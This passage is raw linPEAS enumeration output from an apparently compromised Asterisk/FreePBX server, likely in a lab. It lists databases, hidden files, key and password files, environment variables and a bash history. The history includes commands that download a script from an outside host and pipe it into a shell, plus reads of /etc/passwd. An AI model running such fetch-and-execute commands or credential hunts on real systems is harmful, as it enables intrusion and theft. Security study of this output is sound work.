+Found /etc/aliases.db: Berkeley DB (Hash, version 9, native byte-order)
+Found /etc/openldap/certs/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found /etc/openldap/certs/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found /etc/openldap/certs/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found /etc/pki/nssdb/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found /etc/pki/nssdb/cert9.db: SQLite 3.x database
+Found /etc/pki/nssdb/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found /etc/pki/nssdb/key4.db: SQLite 3.x database
+Found /etc/pki/nssdb/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found /var/lib/asterisk/astdb.sqlite3: SQLite 3.x database
+Found /var/lib/yum/history/history-2025-11-30.sqlite: regular file, no read permission
+Found /var/www/html/admin/libraries/media/resources/glob.db: ASCII text
+Found /var/www/html/admin/libraries/media/resources/magic.db: data
+
+ -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
+ -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
+ -> Extracting tables from /var/lib/asterisk/astdb.sqlite3 (limit 20)
+
+╔══════════╣ Web files?(output limit) (T1005)
+/var/www/:
+total 4.0K
+drwxr-xr-x.  4 root     root       33 Nov 30  2025 .
+drwxr-xr-x. 23 root     root     4.0K May 21 10:37 ..
+drwxr-xr-x.  2 root     root        6 Apr  2  2020 cgi-bin
+drwxrwxr-x.  4 asterisk asterisk  113 May 19 18:22 html
+
+/var/www/cgi-bin:
+total 0
+drwxr-xr-x. 2 root root  6 Apr  2  2020 .
+╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) (T1564.001)
+-rw-r--r--. 1 root root 172 Aug 25  2020 /boot/.vmlinuz-3.10.0-1127.19.1.el7.x86_64.hmac
+-rw-r--r-- 1 root root 0 Jun 21 17:49 /run/initramfs/.need_shutdown
+-rw-r--r--. 1 root root 129 Jun 30  2020 /etc/selinux/targeted/.policy.sha512
+-rw-------. 1 root root 0 Nov 30  2025 /etc/.pwd.lock
+-rw-r--r--. 1 root root 18 Apr  1  2020 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 163 Nov 30  2025 /etc/.updated
+-rw-r--r--. 1 root root 0 Nov 30  2025 /var/lib/rpm/.rpm.lock
+-rw-r--r--. 1 root root 31956 Nov 30  2025 /var/lib/pear/.filemap
+-rw-r--r--. 1 root root 0 Nov 30  2025 /var/lib/pear/.lock
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-en-ulaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 27  2016 /var/lib/asterisk/sounds/.asterisk-extra-sounds-en-ulaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-en-alaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 27  2016 /var/lib/asterisk/sounds/.asterisk-extra-sounds-en-g722-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 27  2016 /var/lib/asterisk/sounds/.asterisk-extra-sounds-en-sln16-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 27  2016 /var/lib/asterisk/sounds/.asterisk-extra-sounds-en-alaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-en-g722-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-en-sln16-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-it-ulaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-fr-ulaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-ja-ulaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-en_GB-ulaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Oct 26  2016 /var/lib/asterisk/sounds/.asterisk-core-sounds-es-ulaw-1.5
+-rw-rw-r--. 1 asterisk asterisk 0 Mar  8  2016 /var/lib/asterisk/moh/.asterisk-moh-opsound-sln
+-rw-rw-r--. 1 asterisk asterisk 0 Mar  8  2016 /var/lib/asterisk/moh/.asterisk-moh-opsound-sln16
+-rw-rw-r--. 1 asterisk asterisk 0 Mar  8  2016 /var/lib/asterisk/moh/.asterisk-moh-opsound-alaw
+-rw-rw-r--. 1 asterisk asterisk 16 Nov  2  2023 /var/www/html/.htaccess
+-rw-rw-r--. 1 asterisk asterisk 1623 Nov  2  2023 /var/www/html/admin/.htaccess
+-rw-rw-r--. 1 asterisk asterisk 21 Nov  2  2023 /var/www/html/admin/.user.ini
+-rw-rw-r--. 1 asterisk asterisk 752 Nov  2  2023 /var/www/html/admin/api/.htaccess
+-rw-rw-r--. 1 asterisk asterisk 1112 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/doctrine/annotations/.doctrine-project.json
+-rw-rw-r--. 1 asterisk asterisk 250 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/doctrine/collections/.doctrine-project.json
+-rw-rw-r--. 1 asterisk asterisk 900 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/doctrine/instantiator/.doctrine-project.json
+-rw-rw-r--. 1 asterisk asterisk 97 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/doctrine/orm/.coveralls.yml
+-rw-rw-r--. 1 asterisk asterisk 3701 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/guzzlehttp/promises/.php_cs.dist
+-rw-rw-r--. 1 asterisk asterisk 234 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/mtdowling/cron-expression/.editorconfig
+-rw-rw-r--. 1 asterisk asterisk 17 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/nikic/fast-route/.hhconfig
+-rw-rw-r--. 1 asterisk asterisk 791 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/pimple/pimple/.php_cs.dist
+-rw-rw-r--. 1 asterisk asterisk 1087 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/respect/validation/.php_cs
+-rw-rw-r--. 1 asterisk asterisk 356 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/respect/validation/.scrutinizer.yml
+-rw-rw-r--. 1 asterisk asterisk 620 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/sepia/po-parser/.scrutinizer.yml
+-rw-rw-r--. 1 asterisk asterisk 484 Nov  2  2023 /var/www/html/admin/libraries/Composer/vendor/swiftmailer/swiftmailer/.php_cs.dist
+-rw-rw-r--. 1 asterisk asterisk 645 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/vendor/guzzlehttp/guzzle/.php_cs
+-rw-rw-r--. 1 asterisk asterisk 439 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/ajv/.tonic_example.js
+-rw-rw-r--. 1 asterisk asterisk 62 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/ajv/scripts/.eslintrc.yml
+-rw-rw-r--. 1 asterisk asterisk 286 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/extend/.editorconfig
+-rw-rw-r--. 1 asterisk asterisk 397 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/extend/.eslintrc
+-rw-rw-r--. 1 asterisk asterisk 4096 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/extend/.jscs.json
+-rw-rw-r--. 1 asterisk asterisk 562 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/fast-json-stable-stringify/.eslintrc.yml
+-rw-rw-r--. 1 asterisk asterisk 178 Aug 25  2017 /var/www/html/admin/modules/api/node/node_modules/http-signature/.dir-locals.el
+-rw-rw-r--. 1 asterisk asterisk 1147 Apr  6  2014 /var/www/html/admin/modules/api/node/node_modules/isstream/.jshintrc
+-rw-rw-r--. 1 asterisk asterisk 630 May  8  2018 /var/www/html/admin/modules/api/node/node_modules/json-schema-traverse/.eslintrc.yml
+-rw-rw-r--. 1 asterisk asterisk 91 May  8  2018 /var/www/html/admin/modules/api/node/node_modules/json-schema-traverse/spec/.eslintrc.yml
+-rw-rw-r--. 1 asterisk asterisk 275 Mar 23  2018 /var/www/html/admin/modules/api/node/node_modules/marked/.editorconfig
+-rw-rw-r--. 1 asterisk asterisk 627 Mar 23  2018 /var/www/html/admin/modules/api/node/node_modules/marked/.eslintrc.json
+-rw-rw-r--. 1 asterisk asterisk 193 Jan  3  2017 /var/www/html/admin/modules/api/node/node_modules/performance-now/.tm_properties
+-rw-rw-r--. 1 asterisk asterisk 569 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/qs/.editorconfig
+-rw-rw-r--. 1 asterisk asterisk 956 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/qs/.eslintrc
+-rw-rw-r--. 1 asterisk asterisk 216 Oct 26  1985 /var/www/html/admin/modules/api/node/node_modules/qs/.nycrc
+-rw-rw-r--. 1 asterisk asterisk 1697 Nov  2  2023 /var/www/html/admin/modules/api/vendor/defuse/php-encryption/.php_cs
+-rw-rw-r--. 1 asterisk asterisk 1622 Nov  2  2023 /var/www/html/admin/modules/api/vendor/lcobucci/jwt/.scrutinizer.yml
+-rw-rw-r--. 1 asterisk asterisk 1323 Nov  2  2023 /var/www/html/admin/modules/api/vendor/league/oauth2-server/.styleci.yml
+-rw-rw-r--. 1 asterisk asterisk 1018 Nov  2  2023 /var/www/html/admin/modules/api/vendor/webonyx/graphql-php/.scrutinizer.yml
+-rw-rw-r--. 1 asterisk asterisk 10 Nov  2  2023 /var/www/html/admin/modules/calendar/.langignore
+-rw-rw-r--. 1 asterisk asterisk 610 Nov  2  2023 /var/www/html/admin/modules/calendar/vendor/eluceo/ical/.php_cs
+-rw-rw-r--. 1 asterisk asterisk 366 Nov  2  2023 /var/www/html/admin/modules/calendar/vendor/eluceo/ical/.scrutinizer.yml
+-rw-rw-r--. 1 asterisk asterisk 143 Nov  2  2023 /var/www/html/admin/modules/calendar/vendor/jamesiarmes/php-ntlm/.scrutinizer.yml
+-rw-rw-r--. 1 asterisk asterisk 193 Nov  2  2023 /var/www/html/admin/modules/calendar/vendor/php-ews/php-ews/.scrutinizer.yml
+-rw-rw-r--. 1 asterisk asterisk 645 Nov  2  2023 /var/www/html/admin/modules/cloudmigration/vendor/guzzlehttp/guzzle/.php_cs
+-rw-rw-r--. 1 asterisk asterisk 2112 Nov  2  2023 /var/www/html/admin/modules/cloudmigration/vendor/guzzlehttp/psr7/.php_cs.dist
+-rw-rw-r--. 1 asterisk asterisk 24 Nov  2  2023 /var/www/html/admin/modules/configedit/.langignore
+grep: write error
+grep: write error
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) (T1552.001)
+grep: write error
+-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 /etc/asterisk/backup/ari.conf.bk.1698911536
+-rw-rw-r--. 1 asterisk asterisk 474 Nov  2  2023 /var/www/html/admin/modules/adv_recovery/assets/css/backup/cronui.css
+-rw-rw-r--. 1 asterisk asterisk 148 Nov  2  2023 /var/www/html/admin/modules/backup/.gitattributes
+-rw-rw-r--. 1 asterisk asterisk 25420 Nov  2  2023 /var/www/html/admin/modules/backup/Api/Gql/Backup.php
+-rw-rw-r--. 1 asterisk asterisk 49858 Nov  2  2023 /var/www/html/admin/modules/backup/Backup.class.php
+-rw-rw-r--. 1 asterisk asterisk 267 Nov  2  2023 /var/www/html/admin/modules/backup/Backup.php
+-rw-rw-r--. 1 asterisk asterisk 7956 Nov  2  2023 /var/www/html/admin/modules/backup/BackupBase.php
+-rw-rw-r--. 1 asterisk asterisk 18961 Nov  2  2023 /var/www/html/admin/modules/backup/Console/Backup.class.php
+-rw-rw-r--. 1 asterisk asterisk 7891 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Backup/Common.php
+-rw-rw-r--. 1 asterisk asterisk 2054 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Backup/Email.php
+-rw-rw-r--. 1 asterisk asterisk 6174 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Backup/Maintenance.php
+-rw-rw-r--. 1 asterisk asterisk 9299 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Backup/Multiple.php
+-rw-rw-r--. 1 asterisk asterisk 1923 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Backup/Single.php
+-rw-rw-r--. 1 asterisk asterisk 3147 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/CommonBase.php
+-rw-rw-r--. 1 asterisk asterisk 267 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/CommonFile.php
+-rw-rw-r--. 1 asterisk asterisk 1454 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/FreePBXModule.php
+-rw-rw-r--. 1 asterisk asterisk 11097 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Restore/Common.php
+-rw-rw-r--. 1 asterisk asterisk 17565 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Restore/Legacy.php
+-rw-rw-r--. 1 asterisk asterisk 4943 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Restore/Multiple.php
+-rw-rw-r--. 1 asterisk asterisk 930 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Restore/Single.php
+-rw-rw-r--. 1 asterisk asterisk 1515 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Restore/Warmspare.php
+-rw-rw-r--. 1 asterisk asterisk 2739 Nov  2  2023 /var/www/html/admin/modules/backup/Handlers/Storage.php
+-rw-rw-r--. 1 asterisk asterisk 86 Nov  2  2023 /var/www/html/admin/modules/backup/Json/JsonException.php
+-rw-rw-r--. 1 asterisk asterisk 310 Nov  2  2023 /var/www/html/admin/modules/backup/Json/json_decode.php
+-rw-rw-r--. 1 asterisk asterisk 286 Nov  2  2023 /var/www/html/admin/modules/backup/Json/json_encode.php
+-rw-rw-r--. 1 asterisk asterisk 35147 Nov  2  2023 /var/www/html/admin/modules/backup/LICENSE
+-rw-rw-r--. 1 asterisk asterisk 10180 Nov  2  2023 /var/www/html/admin/modules/backup/Migration/Backupjobs.php
+-rw-rw-r--. 1 asterisk asterisk 214 Nov  2  2023 /var/www/html/admin/modules/backup/Migration/Common.php
+-rw-rw-r--. 1 asterisk asterisk 3083 Nov  2  2023 /var/www/html/admin/modules/backup/Migration/Servers.php
+-rw-rw-r--. 1 asterisk asterisk 4264 Nov  2  2023 /var/www/html/admin/modules/backup/Models/Backup.php
+-rw-rw-r--. 1 asterisk asterisk 2464 Nov  2  2023 /var/www/html/admin/modules/backup/Models/BackupSplFileInfo.php
+-rw-rw-r--. 1 asterisk asterisk 3523 Nov  2  2023 /var/www/html/admin/modules/backup/Models/ModelBase.php
+-rw-rw-r--. 1 asterisk asterisk 1908 Nov  2  2023 /var/www/html/admin/modules/backup/Models/Restore.php
+-rw-rw-r--. 1 asterisk asterisk 1319 Nov  2  2023 /var/www/html/admin/modules/backup/Models/SplFileInfo.php
+-rw-rw-r--. 1 asterisk asterisk 1004 Nov  2  2023 /var/www/html/admin/modules/backup/Monolog/ConsoleOutput.php
+-rw-rw-r--. 1 asterisk asterisk 4920 Nov  2  2023 /var/www/html/admin/modules/backup/Monolog/Swift.php
+-rw-rw-r--. 1 asterisk asterisk 1647 Nov  2  2023 /var/www/html/admin/modules/backup/README.md
+-rw-rw-r--. 1 asterisk asterisk 354 Nov  2  2023 /var/www/html/admin/modules/backup/Restore.php
+-rw-rw-r--. 1 asterisk asterisk 20497 Nov  2  2023 /var/www/html/admin/modules/backup/RestoreBase.php
+-rw-rw-r--. 1 asterisk asterisk 474 Nov  2  2023 /var/www/html/admin/modules/backup/assets/css/backup/cronui.css
+-rw-rw-r--. 1 asterisk asterisk 0 Nov  2  2023 /var/www/html/admin/modules/backup/assets/css/backup_restore/backup_restore.css
+-rw-rw-r--. 1 asterisk asterisk 12587 Nov  2  2023 /var/www/html/admin/modules/backup/assets/css/backup_restore/dropzone.css
+-rw-rw-r--. 1 asterisk asterisk 5667 Nov  2  2023 /var/www/html/admin/modules/backup/assets/images/backup.svg
+-rw-rw-r--. 1 asterisk asterisk 5667 Nov  2  2023 /var/www/html/admin/modules/backup/assets/images/restore.svg
+-rw-rw-r--. 1 asterisk asterisk 5667 Nov  2  2023 /var/www/html/admin/modules/backup/assets/images/transfer.svg
+-rw-rw-r--. 1 asterisk asterisk 19146 Nov  2  2023 /var/www/html/admin/modules/backup/assets/js/backup.js
+-rw-rw-r--. 1 asterisk asterisk 121518 Nov  2  2023 /var/www/html/admin/modules/backup/assets/js/dropzone.js
+-rw-rw-r--. 1 asterisk asterisk 16072 Nov  2  2023 /var/www/html/admin/modules/backup/assets/js/jquery.cronui.js
+-rw-rw-r--. 1 asterisk asterisk 2871 Nov  2  2023 /var/www/html/admin/modules/backup/assets/js/templates.js
+-rw-rw-r--. 1 asterisk asterisk 410 Nov  2  2023 /var/www/html/admin/modules/backup/assets/less/backup.less
+-rw-rw-r--. 1 asterisk asterisk 420 Nov 30  2025 /var/www/html/admin/modules/backup/assets/less/cache/lessphp_48e29f4fc8960be2e0cfa16f452721798b5ddb1b.css
+-rw-rw-r--. 1 asterisk asterisk 111 Nov 30  2025 /var/www/html/admin/modules/backup/assets/less/cache/lessphp_c53defb26f944a1f4653d86d7fcba644.list
+-rw-rw-r--. 1 asterisk asterisk 17990 Nov  2  2023 /var/www/html/admin/modules/backup/assets/less/cache/lessphp_esba6gvmu144oocssko0o84kss00gww.lesscache
+-rw-rw-r--. 1 asterisk asterisk 237 Nov  2  2023 /var/www/html/admin/modules/backup/composer.json
+-rw-rw-r--. 1 asterisk asterisk 11649 Nov  2  2023 /var/www/html/admin/modules/backup/composer.lock
+-rw-rw-r--. 1 asterisk asterisk 234 Nov  2  2023 /var/www/html/admin/modules/backup/examples/Backup.php.template
+-rw-rw-r--. 1 asterisk asterisk 331 Nov  2  2023 /var/www/html/admin/modules/backup/examples/Restore.php.template
+-rw-rw-r--. 1 asterisk asterisk 30712 Nov  2  2023 /var/www/html/admin/modules/backup/functions.inc/class.backup.php
+-rwxr-xr-x. 1 asterisk asterisk 150 Nov  2  2023 /var/www/html/admin/modules/backup/hooks/clearunuseddevices
+-rwxr-xr-x. 1 asterisk asterisk 215 Nov  2  2023 /var/www/html/admin/modules/backup/hooks/logrotate
+-rwxr-xr-x. 1 asterisk asterisk 2364 Nov  2  2023 /var/www/html/admin/modules/backup/hooks/perform-backup
+-rwxr-xr-x. 1 asterisk asterisk 1109 Nov  2  2023 /var/www/html/admin/modules/backup/hooks/perform-restore
+-rw-rw-r--. 1 asterisk asterisk 43426 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/backup.pot
+-rw-rw-r--. 1 asterisk asterisk 7100 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/bg_BG/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 38445 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/bg_BG/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 5497 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/de_DE/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 72756 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/de_DE/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 22298 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/es_ES/LC_MESSAGES/backup.mo
+-rw-rw-r--. 1 asterisk asterisk 41908 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/es_ES/LC_MESSAGES/backup.po
+-rw-rw-r--. 1 asterisk asterisk 6769 Nov  2  2023 /var/www/html/admin/modules/backup/i18n/fa_IR/LC_MESSAGES/backup.mo
+
+╔══════════╣ Searching passwords in history files (T1552.001)
+/home/asterisk/.bash_history:su root
+/home/asterisk/.bash_history:cat /etc/passwd
+/home/asterisk/.bash_history:wget http://10.10.15.34:8080/linpeas.sh
+/home/asterisk/.bash_history:./linpeas.sh
+/home/asterisk/.bash_history:curl http://10.10.15.34:8080/linpeas.sh | sh
+/home/asterisk/.bash_history:sudo -l
+/home/asterisk/.bash_history:curl http://10.10.15.34:8080/linpeas.sh | sh > output.txt
+Binary file /usr/lib64/asterisk/modules/res_pjsip_history.so matches
+Binary file /usr/lib64/python3.6/idlelib/idle_test/__pycache__/test_history.cpython-36.opt-1.pyc matches
+Binary file /usr/lib64/python3.6/idlelib/idle_test/__pycache__/test_history.cpython-36.opt-2.pyc matches
+Binary file /usr/lib64/python3.6/idlelib/idle_test/__pycache__/test_history.cpython-36.pyc matches
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:    @classmethod
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:    @classmethod
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:        cls.root = tk.Tk()
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:        cls.root.withdraw()
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:        self.text = text = TextWrapper(self.root)
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:    @classmethod
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:        cls.root.destroy()
+/usr/lib64/python3.6/idlelib/idle_test/test_history.py:        del cls.root
+/var/www/html/admin/modules/cloudmigration/vendor/aws/aws-sdk-php/src/data/endpoints_prefix_history.json.php:// This file was auto-generated from sdk-root/src/data/endpoints_prefix_history.json
+/var/www/html/admin/modules/filestore/vendor/aws/aws-sdk-php/src/data/endpoints_prefix_history.json.php:// This file was auto-generated from sdk-root/src/data/endpoints_prefix_history.json
+
+╔══════════╣ Searching passwords in config PHP files (T1552.001)
+/var/www/html/admin/config.php:	'confirm_password'	=> '',
+/var/www/html/admin/config.php:	'password'			=> '',
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70) (T1552.001)
+/etc/asterisk/keys/api_oauth.key
+/etc/asterisk/keys/api_oauth_public.key
+/etc/asterisk/keys/ca.key
+/etc/asterisk/keys/default.key
+  #)There are more creds/passwds files in the previous parent folder
+
+/etc/openldap/certs/password
+/etc/pam.d/password-auth
+/etc/pam.d/password-auth-ac
+/etc/pki/tls/private/localhost.key
+/etc/trusted-key.key
+/etc/unbound/dlv.isc.org.key
+/etc/unbound/root.key
+/usr/bin/systemd-ask-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/lib64/mysql/plugin/mysql_clear_password.so
+/usr/lib/grub/i386-pc/legacy_password_test.mod
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/lib/management/jmxremote.password.template
+/usr/lib/node_modules/npm/lib/config/clear-credentials-by-uri.js
+/usr/lib/node_modules/npm/lib/config/get-credentials-by-uri.js
+/usr/lib/node_modules/npm/lib/config/set-credentials-by-uri.js
+/usr/lib/systemd/systemd-reply-password
+/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.service
+/usr/lib/systemd/system/systemd-ask-password-plymouth.path
+/usr/lib/systemd/system/systemd-ask-password-plymouth.service
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/augeas/lenses/dist/jmxpassword.aug
+/usr/share/doc/openwssh-7.4p1/PROTOCOL.key
+/usr/share/man/man1/systemd-ask-password.1.gz
+/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
+/usr/share/man/man5/password-auth.5.gz
+/usr/share/man/man5/password-auth-ac.5.gz
+/usr/share/man/man7/credentials.7.gz
+/usr/share/man/man8/grub2-setpassword.8.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/nmap/nselib/data/passwords.lst
+/usr/share/nmap/scripts/creds-summary.nse
+/usr/share/nmap/scripts/http-domino-enum-passwords.nse
+/usr/share/nmap/scripts/ms-sql-empty-password.nse
+/usr/share/nmap/scripts/mysql-empty-password.nse
+  #)There are more creds/passwds files in the previous parent folder
+
+/var/lib/asterisk/sounds/en/enter-password.alaw
+/var/lib/asterisk/sounds/en/enter-password.g722
+/var/lib/asterisk/sounds/en/enter-password.sln16
+/var/lib/asterisk/sounds/en/enter-password.ulaw
+  #)There are more creds/passwds files in the previous parent folder
+
+/var/lib/asterisk/sounds/en_GB/vm-invalidpassword.ulaw
+/var/lib/asterisk/sounds/en_GB/vm-newpassword.ulaw
+/var/lib/asterisk/sounds/en_GB/vm-password.ulaw
+  #)There are more creds/passwds files in the previous parent folder
+
+/var/lib/asterisk/sounds/en/passwords_not_match.g722
+/var/lib/asterisk/sounds/en/passwords_not_match.sln16
+/var/lib/asterisk/sounds/en/passwords_not_match.ulaw
+  #)There are more creds/passwds files in the previous parent folder
+
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs (T1552.001)
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs (T1083)
+
+╔══════════╣ Searching passwords inside logs (limit 70) (T1552.001)
+
+╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars (T1552.007,T1082)
+_=/bin/bash
+_=/bin/nice
+HOME=/home/asterisk
+LANG=en_US.utf8
+LANG=en_US.UTF-8
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+LOGNAME=asterisk
+OLDPWD=/
+PWD=/home/asterisk
+PWD=/tmp
+SHELL=/bin/bash
+SHELL=/bin/sh
+SHLVL=1
+SHLVL=2
+SHLVL=3
+SHLVL=4
+SHLVL=5
+SHLVL=6
+SHLVL=7
+TERM=xterm
+USER=asterisk
+_=/usr/bin/bash
+_=/usr/bin/cat
+_=/usr/bin/dd
+_=/usr/bin/grep
+_=/usr/bin/sh
+_=/usr/bin/sleep
+_=/usr/bin/tr
+_=/usr/bin/xxd
+_=/usr/sbin/fwconsole
+_=/var/www/html/admin/modules/iotserver/bin/check_system_settings.sh
+XDG_RUNTIME_DIR=/run/user/999
+[asterisk@connected ~]$ 
